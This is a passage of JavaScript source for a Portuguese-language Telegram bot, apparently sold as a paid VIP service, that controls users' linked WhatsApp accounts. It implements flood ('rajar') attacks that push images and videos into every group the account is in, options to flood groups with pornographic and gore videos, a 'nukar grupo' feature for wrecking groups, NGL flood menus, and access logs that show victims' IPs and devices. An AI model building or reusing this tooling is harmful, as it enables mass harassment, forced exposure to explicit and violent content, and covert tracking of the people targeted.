                return ctx.reply(`<blockquote>📊 <b>PAINEL DE LOGS ONLINE</b>\n\nDevido à mudança para uma nova API mais segura, os relatórios completos agora estão disponíveis no painel web:\n\n🌐 <a href="${res.external_link}">Clique aqui para ver os Acessos</a>\n\n⚡ <i>Corvo Intelligence System</i></blockquote>`, { parse_mode: 'HTML' }).catch(() => { });
            }
            if (!res.logs || res.logs.length === 0) {
                return ctx.reply('ℹ️ • Nenhum acesso registrado para esta Key ainda.').catch(() => { });
            }
            let msg = `📊 • *LOGS DE ACESSO (${res.logs.length})*\n\n`;
            res.logs.slice(0, 10).forEach((log, i) => {
                msg += `${i + 1}. 🕒 \`${new Date(log.data).toLocaleString('pt-BR')}\`\n`;
                msg += `📍 IP: \`${log.ip}\` | 📱 Device: \`${log.device || 'N/A'}\`\n\n`;
            });
            if (res.logs.length > 10) msg += `_Exibindo apenas os últimos 10 acessos registrados._`;
            ctx.reply(msg, { parse_mode: 'Markdown' }).catch(() => { });
        } else {
            ctx.reply(`❌ • Erro na consulta: ${res.mensagem || 'ID ou Key inválidos.'}`).catch(() => { });
        }
    }
});

// Handler para fotos (Rajar 4 Flood Status com imagem)
bot.on('photo', async (ctx) => {
    const tid = ctx.from.id;
    const state = userStates[tid];

    if (ctx.message?.message_id) {
        trackUserMessage(tid, ctx.message.message_id);
        safeDeleteMessage(ctx, ctx.message.message_id, 2000);
    }

    if (state && state.startsWith('wait_rajar4_image_')) {
        const jid = state.replace('wait_rajar4_image_', '');
        delete userStates[tid];

        try {
            ctx.reply('📷 • *Processando foto...*', { parse_mode: 'Markdown' }).catch(() => { });

            // Pega a legenda se tiver
            const caption = ctx.message.caption || null;

            // Pega a foto de maior resolução
            const photoArray = ctx.message.photo;
            const photo = photoArray[photoArray.length - 1];
            const fileId = photo.file_id;

            // Baixa o arquivo
            const file = await ctx.telegram.getFile(fileId);
            const fileUrl = `https://api.telegram.org/file/bot${TELEGRAM_TOKEN}/${file.file_path}`;
            const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
            const mediaBuffer = Buffer.from(response.data);

            // Verifica se é para TODOS os grupos
            if (jid === 'ALL_GROUPS') {
                const sock = userSessions[tid];
                if (!sock?.user) return ctx.reply('❌ • WhatsApp desconectado!').catch(() => { });
                try {
                    const chats = await sock.groupFetchAllParticipating();
                    const groups = Object.values(chats);
                    if (groups.length === 0) return ctx.reply('❌ • Nenhum grupo encontrado.').catch(() => { });

                    ctx.reply(`📷 • *Iniciando rajada de FOTO em ${groups.length} grupos...*\n\n⏳ Isso pode levar alguns minutos.`, { parse_mode: 'Markdown' }).catch(() => { });

                    for (const group of groups) {
                        try {
                            await rajar4FloodStatus(tid, group.id, ctx, 'image', mediaBuffer, caption);
                            await delay(5000); // Delay de 5s entre cada grupo
                        } catch (e) {
                            logEvent('ERROR', `Erro ao rajar foto no grupo ${group.subject}: ${e.message}`);
                        }
                    }
                    ctx.reply(`✅ • *Rajada de FOTO concluída em ${groups.length} grupos!*`, { parse_mode: 'Markdown' }).catch(() => { });
                } catch (e) {
                    ctx.reply('❌ • Erro ao buscar grupos.').catch(() => { });
                }
            } else {
                // Rajar em um grupo específico
                await rajar4FloodStatus(tid, jid, ctx, 'image', mediaBuffer, caption);
            }
        } catch (e) {
            logEvent('ERROR', `Erro ao processar foto para Rajar 4: ${e.message}`);
            ctx.reply('❌ • Erro ao processar a foto. Tente novamente.').catch(() => { });
        }
    }
});

// Handler para vídeos (Rajar 4 Flood Status com vídeo)
bot.on('video', async (ctx) => {
    const tid = ctx.from.id;
    const state = userStates[tid];

    if (ctx.message?.message_id) {
        trackUserMessage(tid, ctx.message.message_id);
        safeDeleteMessage(ctx, ctx.message.message_id, 2000);
    }

    if (state === 'wait_ai_transformer_media') {
        const fileId = ctx.message.video.file_id;
        const mediaData = Buffer.from(JSON.stringify({ type: 'video', fileId: fileId })).toString('base64');
        userStates[tid] = `wait_ai_transformer_prompt_${mediaData}`;
        return ctx.reply('<blockquote>🎭 <b>VÍDEO RECEBIDO!</b>\n\nAgora, descreva o que você deseja que a IA transforme no seu vídeo.\n\nEx: <i>Coloque um estilo cyberpunk</i> ou <i>faça parecer que está em baixo da água</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
    }

    if (state && state.startsWith('wait_rajar4_video_')) {
        const jid = state.replace('wait_rajar4_video_', '');
        delete userStates[tid];

        try {
            ctx.reply('🎬 • *Processando vídeo...*', { parse_mode: 'Markdown' }).catch(() => { });

            // Pega a legenda se tiver
            const caption = ctx.message.caption || null;

            const video = ctx.message.video;
            const fileId = video.file_id;

            // Baixa o arquivo
            const file = await ctx.telegram.getFile(fileId);
            const fileUrl = `https://api.telegram.org/file/bot${TELEGRAM_TOKEN}/${file.file_path}`;
            const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
            const mediaBuffer = Buffer.from(response.data);

            // Verifica se é para TODOS os grupos
            if (jid === 'ALL_GROUPS') {
                const sock = userSessions[tid];
                if (!sock?.user) return ctx.reply('❌ • WhatsApp desconectado!').catch(() => { });
                try {
                    const chats = await sock.groupFetchAllParticipating();
                    const groups = Object.values(chats);
                    if (groups.length === 0) return ctx.reply('❌ • Nenhum grupo encontrado.').catch(() => { });

                    ctx.reply(`🎬 • *Iniciando rajada de VÍDEO em ${groups.length} grupos...*\n\n⏳ Isso pode levar alguns minutos.`, { parse_mode: 'Markdown' }).catch(() => { });

                    for (const group of groups) {
                        try {
                            await rajar4FloodStatus(tid, group.id, ctx, 'video', mediaBuffer, caption);
                            await delay(5000); // Delay de 5s entre cada grupo
                        } catch (e) {
                            logEvent('ERROR', `Erro ao rajar vídeo no grupo ${group.subject}: ${e.message}`);
                        }
                    }
                    ctx.reply(`✅ • *Rajada de VÍDEO concluída em ${groups.length} grupos!*`, { parse_mode: 'Markdown' }).catch(() => { });
                } catch (e) {
                    ctx.reply('❌ • Erro ao buscar grupos.').catch(() => { });
                }
            } else {
                // Rajar em um grupo específico
                await rajar4FloodStatus(tid, jid, ctx, 'video', mediaBuffer, caption);
            }
        } catch (e) {
            logEvent('ERROR', `Erro ao processar vídeo para Rajar 4: ${e.message}`);
            ctx.reply('❌ • Erro ao processar o vídeo. Tente novamente.').catch(() => { });
        }
    }
});

bot.on('callback_query', async (ctx) => {
    const tid = ctx.from.id;
    const data = ctx.callbackQuery.data;

    // Handler para Responder via Monitor
    if (data.startsWith('reply_monitor_')) {
        const targetUserId = data.replace('reply_monitor_', '');
        userStates[tid] = `wait_monitor_reply_${targetUserId}`;
        return ctx.reply(`<blockquote>💬 <b>RESPONDER USUÁRIO</b>\n\nEnvie a mensagem de resposta para o usuário <code>${targetUserId}</code>.\nOpcionalmente, inclua /cancelar para cancelar.</blockquote>`, { parse_mode: 'HTML' });
    }

    // Handler para mostrar planos VIP em popup no canal
    if (data === 'show_vip_plans_channel') {
        const plansText = `💎 PLANOS VIP:\n\n1 Dia: R$ 4,00\n3 Dias: R$ 9,00\n7 Dias: R$ 17,00\n15 Dias: R$ 25,00\nMensal: R$ 35,00\n\nAdquira abrindo o bot no privado e indo em 💎 • Planos VIP!`;
        return ctx.answerCbQuery(plansText, { show_alert: true });
    }

    // Handler para abrir menu principal
    if (data === 'open_main_menu') {
        await ctx.answerCbQuery('📱 Abrindo menu...');
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        // Menu sem foto, apaga após uso
        await sendMainMenuProfile(ctx, tid);
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    if (data === 'conectar_numero') {
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_num';
        try { await ctx.deleteMessage().catch(() => { }); } catch (e) { }
        await ctx.reply('📞 • *Digite o número com DDD (ex: 5511999999999):*\n\n_Certifique-se de que o número está correto para receber o código de pareamento._', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
        return;
    }

    if (data === 'planos_vip_action') {
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage().catch(() => { }); } catch (e) { }
        const msg = `💎 *PLANOS VIP CORVO DIV* 💎\n\n` +
            `• Benefícios: Consultas LIBERADAS (sem precisar conectar WhatsApp), SEM COOLDOWN, rajar sem propaganda, maior velocidade e suporte prioritário.\n\n` +
            `*TABELA DE VALORES:*\n` +
            `• 1 Dia: *R$ 4,00*\n` +
            `• 3 Dias: *R$ 9,00*\n` +
            `• 1 Semana (7 dias): *R$ 17,00*\n` +
            `• 15 Dias: *R$ 25,00*\n` +
            `• 1 Mês (30 dias): *R$ 35,00*\n\n` +
            `_Escolha o tempo de VIP abaixo para gerar o PIX:_`;
        await ctx.reply(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('💳 VIP 1 Dia (R$ 4)', 'buy_vip_1d')],
                [Markup.button.callback('💳 VIP 3 Dias (R$ 9)', 'buy_vip_3d')],
                [Markup.button.callback('💳 VIP 1 Semana (R$ 17)', 'buy_vip_7d')],
                [Markup.button.callback('💳 VIP 15 Dias (R$ 25)', 'buy_vip_15d')],
                [Markup.button.callback('💳 VIP 1 Mês (R$ 35)', 'buy_vip_30d')],
                [Markup.button.callback('🔙 Voltar', 'open_main_menu')]
            ])
        }).catch(() => { });
        return;
    }

    // Handlers de menus inline
    if (data === 'rajar_menu') {
        await ctx.answerCbQuery();
        // Limpa mensagens antigas
        await clearUserMessages(ctx, tid);
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        // Mensagem simples sem foto
        const sentMsg = await ctx.reply('🚀 *MENU DE RAJADA*\n\nEscolha o tipo de rajada:', {
            parse_mode: 'Markdown',
            ...getRajarMenu()
        });
        // Rastreia e apaga mensagem após 30s
        if (sentMsg?.message_id) {
            trackBotMessage(tid, sentMsg.message_id);
            setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        }
        return;
    }

    // Handler para voltar ao menu principal
    if (data === 'back_to_main') {
        await ctx.answerCbQuery('🔙 Voltando...');
        await clearUserMessages(ctx, tid);
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        await sendMainMenuProfile(ctx, tid);
        return;
    }

    if (data === 'tools_menu') {
        await ctx.answerCbQuery();
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply('🛠️ *FERRAMENTAS*\n\nEscolha uma opção:', {
            parse_mode: 'Markdown',
            ...getToolsMenu()
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    if (data === 'consultas_menu') {
        await ctx.answerCbQuery();
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply('🔍 *CONSULTAS*\n\nEscolha o tipo de consulta:', {
            parse_mode: 'Markdown',
            ...getConsultasMenu()
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    if (data === 'flood_menu') {
        await ctx.answerCbQuery();
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply('🌊 *FLOOD NGLs*\n\nEscolha o serviço:', {
            parse_mode: 'Markdown',
            ...getFloodMenu()
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    if (data === 'config_flood') {
        await ctx.answerCbQuery();
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply('⚙️ *CONFIGURAR FLOOD*\n\nDefina o texto e quantidade:', {
            parse_mode: 'Markdown',
            ...getFloodConfigMenu(tid)
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    if (data === 'midias_menu') {
        await ctx.answerCbQuery();
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply('🎬 *MÍDIAS*\n\nBaixar de qual plataforma?', {
            parse_mode: 'Markdown',
            ...getMidiasMenu()
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    if (data === 'vip_menu') {
        await ctx.answerCbQuery();
        const vipPlans = [
            { label: '💎 VIP 1 Dia', price: 4.00, days: 1 },
            { label: '💎 VIP 3 Dias', price: 9.00, days: 3 },
            { label: '💎 VIP 7 Dias', price: 17.00, days: 7 },
            { label: '💎 VIP 15 Dias', price: 25.00, days: 15 },
            { label: '💎 VIP 30 Dias', price: 35.00, days: 30 }
        ];
        let msg = '💎 *PLANOS VIP CORVO DIV*\n\n✨ *VANTAGENS VIP:*\n• Sem cooldown\n• Consultas ilimitadas\n• Prioridade no suporte\n• Acesso a recursos exclusivos\n\n📋 *ESCOLHA SEU PLANO:*';
        const vipButtons = vipPlans.map(plan => [
            Markup.button.callback(`${plan.label} - R$ ${plan.price.toFixed(2).replace('.', ',')}`, `buy_vip_${plan.days}d`)
        ]);
        vipButtons.push([Markup.button.callback('🔙 Voltar', 'open_main_menu')]);
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(vipButtons)
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
        return;
    }

    // Callback para comprar VIP (tratado em outro lugar)
    // Este callback é tratado no final do arquivo com a geração automática do PIX

    if (data === 'config_menu') {
        await ctx.answerCbQuery();
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply('⚙️ *CONFIGURAÇÕES*\n\nAltere suas preferências:', {
            parse_mode: 'Markdown',
            ...getConfigMenu(tid)
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    if (data === 'admin_panel') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!');
        await ctx.answerCbQuery();
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply('👑 *PAINEL ADMIN*\n\nGerenciamento do bot:', {
            parse_mode: 'Markdown',
            ...getAdminMenu()
        });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
        return;
    }

    // Callback para dar VIP (admin)
    if (data === 'admin_give_vip') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!');
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage().catch(() => { }); } catch (e) { }
        userStates[tid] = 'wait_give_vip';
        const sentMsg = await ctx.reply('💎 • *DAR VIP MANUALMENTE*\n\n📝 Envie no formato:\n`ID DIAS`\n\n*Exemplo:*\n`123456789 30`\n\nIsso dará 30 dias de VIP para o usuário com ID 123456789', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    // Callback para remover VIP (admin)
    if (data === 'admin_remove_vip') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!');
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage().catch(() => { }); } catch (e) { }
        userStates[tid] = 'wait_remove_vip';
        const sentMsg = await ctx.reply('🗑️ • *REMOVER VIP / DIAS*\n\n📝 Envie apenas o ID para remover TOTALMENTE.\n📝 Envie `ID DIAS` para remover dias específicos.\n\nExemplo para remover 5 dias: `123456789 5`', { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancelar', 'admin_panel')]]) }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    // Callback para broadcast (admin)
    if (data === 'admin_broadcast_all') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!');
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage().catch(() => { }); } catch (e) { }
        userStates[tid] = 'wait_broadcast';
        const sentMsg = await ctx.reply('📢 • *BROADCAST GLOBAL*\n\n📝 Envie a mensagem que deseja enviar para TODOS os usuários:', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    if (data === 'sobre') {
        await ctx.answerCbQuery();
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        const sentMsg = await ctx.reply('ℹ️ *SOBRE O BOT*\n\nInformações e suporte:', {
            parse_mode: 'Markdown',
            ...getAboutMenu()
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
        return;
    }

    // Callbacks para conectar WhatsApp
    if (data === 'connect_whatsapp') {
        await ctx.answerCbQuery();
        try { await ctx.deleteMessage().catch(() => { }); } catch (e) { }
        userStates[tid] = 'wait_num';
        const sentMsg = await ctx.reply('📞 • *Digite o número com DDD (ex: 5511999999999):*\n\n_Certifique-se de que o número está correto para receber o código de pareamento._', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
        return;
    }

    if (data === 'ligar_whatsapp') {
        if (userSessions[tid]?.user) return ctx.answerCbQuery('✅ O sistema já está Online!', { show_alert: true });
        if (hasSession(tid)) {
            await ctx.answerCbQuery('⏳ Iniciando conexão...');
            try { await ctx.deleteMessage().catch(() => { }); } catch (e) { }
            const waitMsg = await ctx.reply('⏳ • *Iniciando conexão CORVO DIV...*', { parse_mode: 'Markdown' }).catch(() => { });
            if (waitMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => { }), 10000);
            await connectToWhatsApp(tid, ctx);
        } else {
            return ctx.answerCbQuery('❌ Nenhuma sessão salva. Conecte seu número primeiro.', { show_alert: true });
        }
        return;
    }

    if (data === 'disconnect_whatsapp') {
        await ctx.answerCbQuery('🔴 Desligando...');
        try { await ctx.deleteMessage().catch(() => { }); } catch (e) { }
        await disconnectWhatsApp(tid);
        const sentMsg = await ctx.reply('🔴 • *SISTEMA OFFLINE.*', { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 5000);
        return;
    }

    // Callbacks para rajar - mostram lista de grupos
    if (data === 'rajar1_select' || data === 'rajar2_select' || data === 'rajar3_select' || data === 'rajar4_select' || data === 'rajarporno_select' || data === 'rajargore_select') {
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ Conecte o WhatsApp primeiro!', { show_alert: true });
        await ctx.answerCbQuery();
        try {
            const chats = await sock.groupFetchAllParticipating();
            const groups = Object.values(chats);
            if (groups.length === 0) return ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });

            let prefix = data.replace('_select', '');
            const buttons = safeGroupButtons(groups, prefix, 0, tid);
            let title = '🎯 *Selecione o grupo:*';
            if (prefix === 'rajar1') title = '🚀 *RAJAR 1 - PAYMENT*\n\nSelecione o grupo:';
            if (prefix === 'rajar2') title = '🚀 *RAJAR 2 - STATUS*\n\nSelecione o grupo:';
            if (prefix === 'rajar3') title = '🚀 *RAJAR 3 - MIX*\n\nSelecione o grupo:';
            if (prefix === 'rajar4') title = '🌊 *RAJAR 4 - FLOOD STATUS*\n\nSelecione o grupo:';
            if (prefix === 'rajarporno') title = '🎬 *RAJAR VÍDEOS PORNO*\n\nSelecione o grupo:';
            if (prefix === 'rajargore') title = '🎬 *RAJAR VÍDEOS GORE*\n\nSelecione o grupo:';

            // Deleta mensagem anterior e envia nova
            try {
                await ctx.deleteMessage().catch(() => { });
            } catch (e) { }
            await ctx.reply(title, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard(buttons)
            });
        } catch (e) {
            console.error('Erro ao buscar grupos:', e);
            ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
        }
        return;
    }

    // Callbacks adicionais dos botões inline
    if (data === 'listar_grupos') {
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ Conecte o WhatsApp primeiro!', { show_alert: true });
        await ctx.answerCbQuery('📋 Carregando grupos...');
        try {
            const chats = await sock.groupFetchAllParticipating();
            const groups = Object.values(chats);
            let msg = `📋 *SEUS GRUPOS* (${groups.length})\n\n`;
            groups.slice(0, 50).forEach((g, i) => {
                // Filtro robusto de caracteres especiais
                let name = (g.subject || 'Sem nome')
                    .replace(/[\u{1F000}-\u{1FFFF}]/gu, '') // Remove todos emojis
                    .replace(/[\u{2000}-\u{2BFF}]/gu, '') // Remove símbolos
                    .replace(/[\u{FE00}-\u{FEFF}]/gu, '') // Remove variation selectors
                    .replace(/[\u{E000}-\u{F8FF}]/gu, '') // Remove private use area
                    .replace(/\u200B|\u200C|\u200D|\u200E|\u200F/g, '') // Remove zero-width
                    .replace(/\u202A|\u202B|\u202C|\u202D|\u202E/g, '') // Remove bidi controls
                    .replace(/[\x00-\x1F\x7F-\x9F]/g, '') // Remove controles
                    .replace(/[`*_\[\]()~>#+=|{}.!-]/g, '') // Remove markdown
                    .trim()
                    .substring(0, 30) || 'Grupo ' + (i + 1);
                msg += `${i + 1}. ${name}\n`;
            });
            if (groups.length > 50) msg += `\n... e mais ${groups.length - 50} grupos`;
            return ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'open_main_menu')]]) });
        } catch (e) {
            console.error('Erro ao listar grupos:', e);
            return ctx.answerCbQuery('❌ Erro ao buscar grupos', { show_alert: true });
        }
    }

    if (data === 'status_bot') {
        await ctx.answerCbQuery();
        const isConn = userSessions[tid]?.user ? '✅ ONLINE' : '❌ OFFLINE';
        const config = loadUserConfig(tid);
        const msg = `📊 *STATUS DO BOT*\n\n` +
            `🔌 WhatsApp: ${isConn}\n` +
            `🔢 Quantidade: ${config.quantidade || 10}\n` +
            `⏳ Delay: ${config.delay || 2}s\n` +
            `🎭 Nick Auto: ${config.autoNick ? 'Ativo' : 'Inativo'}`;
        return ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'open_main_menu')]]) });
    }

    if (data === 'ping') {
        const start = Date.now();
        await ctx.answerCbQuery('⚡ Pong!');
        const ping = Date.now() - start;
        return ctx.reply(`⚡ *PONG!*\n\n📊 Latência: ${ping}ms`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'open_main_menu')]]) });
    }

    if (data === 'limpar_sessao') {
        await ctx.answerCbQuery('🧹 Limpando sessão...');
        const sessionPath = `/app/sessions/${tid}`;
        try {
            if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                if (userSessions[tid]) {
                    await userSessions[tid].logout();
                    delete userSessions[tid];
                }
                return ctx.reply('✅ Sessão limpa com sucesso!', { parse_mode: 'Markdown', ...getMainMenu(tid) });
            } else {
                return ctx.answerCbQuery('❌ Nenhuma sessão encontrada', { show_alert: true });
            }
        } catch (e) {
            return ctx.answerCbQuery('❌ Erro ao limpar sessão', { show_alert: true });
        }
    }

    if (data === 'doar') {
        await ctx.answerCbQuery();
        const msg = `🎁 *APOIE O BOT*\n\n` +
            `Se você gosta do bot e quer apoiar o desenvolvimento, considere fazer uma doação!\n\n` +
            `💰 PIX: seuemail@exemplo.com\n\n` +
            `Obrigado pelo apoio! 💙`;
        return ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'open_main_menu')]]) });
    }

    if (data === 'cancel_action' || data === 'back_to_menu') {
        await ctx.answerCbQuery('❌ Cancelado');
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        return sendMainMenuProfile(ctx, tid);
    }

    // Callbacks de ferramentas
    if (data === 'info_grupo') {
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_group_id_info';
        return ctx.reply('📋 *INFO DO GRUPO*\n\nEnvie o ID do grupo:', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
    }

    if (data === 'nukar_menu') {
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ Conecte o WhatsApp primeiro!', { show_alert: true });
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_nukar_id';
        return ctx.reply('💣 *NUKAR GRUPO*\n\n⚠️ Envie o ID do grupo que deseja nukar:', { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancelar', 'cancel_action')]]) });
    }

    // Callbacks ainda não implementados - retornam mensagem de "em breve"
    const comingSoonCallbacks = [
        'criar_rastreio', 'consultar_logs', 'puxar_perfil', 'consultar_ip',
        'consultar_cep', 'consultar_cnpj', 'scraper_grupos', 'buscar_grupos_web',
        'flood_ngl', 'flood_sendit', 'set_flood_text', 'set_flood_qty',
        'download_instagram', 'download_tiktok',
        'health_check', 'suporte_bugs', 'sites_oficiais', 'canal_parceiros', 'ser_parceiro',
        'send_suggestion', 'report_bug', 'contact_admin', 'rajar_by_id', 'vip_paid'
    ];

    if (comingSoonCallbacks.includes(data)) {
        await ctx.answerCbQuery('🚧 Em breve!', { show_alert: true });
        return;
    }

    // ========== FUNÇÕES ADMIN IMPLEMENTADAS ==========
    if (data === 'broadcast') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!', { show_alert: true });
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_broadcast';
        return ctx.reply('📢 *BROADCAST GLOBAL*\n\nEnvie a mensagem que deseja enviar para TODOS os usuários:', { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancelar', 'admin_panel')]]) });
    }

    if (data === 'list_users') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!', { show_alert: true });
        await ctx.answerCbQuery();
        const usersArray = Array.from(totalUsers);
        const vipsCount = Object.keys(vips).filter(k => vips[k] && Date.now() < vips[k].expiresAt).length;
        const activeConns = Object.keys(userSessions).filter(k => !!userSessions[k]?.user).length;
        const usersWithData = usersArray.filter(u => usersData[u] && usersData[u].name && usersData[u].name !== 'Desconhecido').length;

        let msg = `👥 *LISTA DE USUÁRIOS*\n\n`;
        msg += `📊 *Estatísticas:*\n`;
        msg += `• Total: ${usersArray.length} usuários\n`;
        msg += `• Com dados: ${usersWithData}/${usersArray.length}\n`;
        msg += `• VIPs Ativos: ${vipsCount}\n`;
        msg += `• Conexões Ativas: ${activeConns}\n`;
        msg += `• Banidos: ${bannedUsers.size}\n\n`;

        // Ordenar: usuários com dados primeiro, depois por lastSeen
        const sortedUsers = [...usersArray].sort((a, b) => {
            const aHasData = usersData[a] && usersData[a].name && usersData[a].name !== 'Desconhecido';
            const bHasData = usersData[b] && usersData[b].name && usersData[b].name !== 'Desconhecido';
            if (aHasData && !bHasData) return -1;
            if (!aHasData && bHasData) return 1;
            const aLastSeen = usersData[a]?.lastSeen || 0;
            const bLastSeen = usersData[b]?.lastSeen || 0;
            return bLastSeen - aLastSeen;
        });

        msg += `📋 *Últimos 20 usuários:*\n`;
        sortedUsers.slice(0, 20).forEach((u, i) => {
            const isVip = isUserVip(u) ? '💎' : '👤';
            const isBanned = bannedUsers.has(u) ? '🚫' : '';
            const userData = usersData[u] || {};
            const name = (userData.name && userData.name !== 'Desconhecido') ? ` ${userData.name}` : '';
            const phone = (userData.phone && userData.phone !== 'N/A') ? ` 📱${userData.phone}` : '';
            msg += `${i + 1}. ${isVip} \`${u}\`${name}${phone} ${isBanned}\n`;
        });

        if (usersArray.length > 20) {
            msg += `\n_... e mais ${usersArray.length - 20} usuários_\n`;
        }
        msg += `\n⚠️ _Usuários sem nome/tel precisam interagir novamente com o bot_`;

        return ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'admin_panel')]]) });
    }

    if (data === 'ban_user') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!', { show_alert: true });
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_ban';
        return ctx.reply('🚫 *BANIR USUÁRIO*\n\nEnvie o ID do Telegram do usuário que deseja banir:', { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancelar', 'admin_panel')]]) });
    }

    if (data === 'give_vip') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!', { show_alert: true });
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_give_vip';
